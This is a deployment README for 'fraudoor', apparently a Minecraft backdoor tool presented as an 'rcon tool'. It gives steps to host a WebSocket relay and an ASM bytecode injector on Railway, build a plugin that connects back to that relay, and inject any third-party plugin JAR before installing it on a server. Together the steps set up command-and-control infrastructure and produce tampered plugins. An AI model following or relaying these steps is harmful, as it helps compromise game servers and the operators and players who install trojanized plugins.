# fraudoor deployment

## ONE service on Railway, ONE on Vercel

```
                     ┌──────────────────────┐
                     │   Vercel             │
                     │   fraudoor-panel     │  React SPA
                     │   (optional - you    │
                     │    can skip this)    │
                     └─────────┬────────────┘
                               │
                     ┌─────────▼────────────┐
                     │   Railway (1 svc)    │
                     │   Dockerfile         │
                     ├──────────────────────┤
                     │ • Node.js :8080      │
                     │   - WebSocket relay  │
                     │   - REST API         │
                     │   - Serves panel UI  │
                     │ • Java 17 (subproc)  │
                     │   - ASM injector     │
                     └──────────────────────┘
                               │
                    ┌──────────┴──────────┐
                    ▼                     ▼
              Paper Server          Velocity Proxy
              fraudoor-rcon.jar    fraudoor-rcon.jar
```

## Step 1: Push to GitHub

```bash
cd C:\Users\fracture\Music\fraudoor
git init
git add .
git commit -m "fraudoor - best rcon tool"
gh repo create fraudoor --public --push
```

## Step 2: Deploy on Railway

1. Go to railway.com → New Project → Deploy from GitHub repo
2. Select your `fraudoor` repo
3. Railway auto-detects the Dockerfile at the root
4. Set env vars:
   - `PORT=8080`
   - `PLUGIN_SECRET=your-secret-here`
5. Deploy — one service, one container, everything inside

## Step 3: (Optional) Deploy panel on Vercel

If you want the panel on Vercel for better global speed:

```bash
cd panel
npm install
vercel --prod
```

Set `VITE_INJECTOR_URL=https://your-railway-app.up.railway.app`
in Vercel env vars.

But you don't need to — the Railway service already serves the panel at
`https://your-railway-app.up.railway.app/`

## Step 4: Build & install the plugin

```bash
cd plugin
./gradlew shadowJar
# → build/libs/fraudoor-rcon-1.0.0-all.jar
```

Drop in `plugins/`, edit `plugins/fraudoor-rcon/config.yml`:
```yaml
server: "wss://your-railway-app.up.railway.app/ws"
```

For Velocity, use `velocity-plugin/` instead.

## Step 5: Use injection on the site

1. Open your Railway URL in a browser
2. Go to Injection tab
3. Upload any plugin JAR, click Inject
4. The Node server spawns the Java ASM injector as a subprocess
5. Download the modified JAR
6. Upload to your server — 1 plugin, everything works

## Summary

| What | Where | Method |
|------|-------|--------|
| Relay + Injector | Railway | 1 Dockerfile, 1 service |
| Panel UI | Railway (served) or Vercel | static or CDN |
| Plugin | Your MC server | build with gradle |
